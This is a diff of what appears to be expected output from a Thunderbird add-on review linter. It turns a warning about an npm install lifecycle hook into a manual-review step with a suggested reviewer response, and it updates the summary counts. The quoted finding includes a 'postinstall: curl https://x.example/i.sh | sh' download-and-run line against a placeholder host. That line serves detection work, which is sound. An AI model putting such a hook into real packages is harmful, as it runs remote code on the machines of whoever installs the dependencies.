@@ -17,12 +17,6 @@ Thank you for your submission. We appreciate the effort you’ve put into creati
 4) This add-on is built with yarn, and only npm and pnpm are supported. Please provide an npm or pnpm build (commit a package-lock.json or pnpm-lock.yaml) so the dependency install can be reviewed against the declared dependencies.
  - [SCA] yarn.lock
 
-We kindly ask you to resolve the following issues with your next release:
-
-5) The package.json declares the following npm install lifecycle hook(s), which run when the reviewer installs the dependencies, before the build. Confirm they only run local build steps and do not fetch or execute remote code (curl/wget, a download-and-run, or a git clone of an unpinned repo).
- - [SCA] package.json:6 - postinstall: curl https://x.example/i.sh | sh
- - [SCA] package.json:7 - prepare: node tools/gen.js
-
 [XPI] = source file in the submitted XPI
 [SCA] = source file in the submitted source code archive
 
@@ -33,7 +27,16 @@ https://github.com/thunderbird/webext-linter
 
 Continue manual review for the following checks:
 
-1) Missing English localization: This add-on ships no English localization, so
+1) Build install hook: The package.json declares the install lifecycle hook(s)
+   below, which run when the reviewer installs the dependencies, before the
+   build. Read each command and confirm it only runs local build steps, fetching
+   or executing nothing remote (curl/wget, a download-and-run, or a git clone of
+   an unpinned repo).
+Suggested response: The package.json declares an npm install lifecycle hook that fetches or executes remote code when the dependencies are installed. Every part of the build must come only from the dependencies declared in package.json/lock. Please remove the remote fetch or execution from the hook.
+ - [SCA] package.json:6 - postinstall: curl https://x.example/i.sh | sh
+ - [SCA] package.json:7 - prepare: node tools/gen.js
+
+2) Missing English localization: This add-on ships no English localization, so
    user-facing text may be hardcoded in another language. Review its strings by
    hand and confirm if an English localization is provided.
 Suggested response: Please include an English localization. English serves as the default language in Thunderbird, and most users who do not understand the hardcoded language will most likely be able to read English. The i18n API allows defining strings for multiple locales, and Thunderbird automatically selects the one that best matches the user’s interface language.
@@ -124,4 +127,4 @@ Because the original project is still active, your submission does not meet thes
 
 ── Summary ──
 
-7 error(s), 2 warning(s), 0 info, 1 extended code review step(s), 1 extended manual review step(s), 10 standard manual review step(s)
+7 error(s), 0 warning(s), 0 info, 3 extended code review step(s), 1 extended manual review step(s), 10 standard manual review step(s)
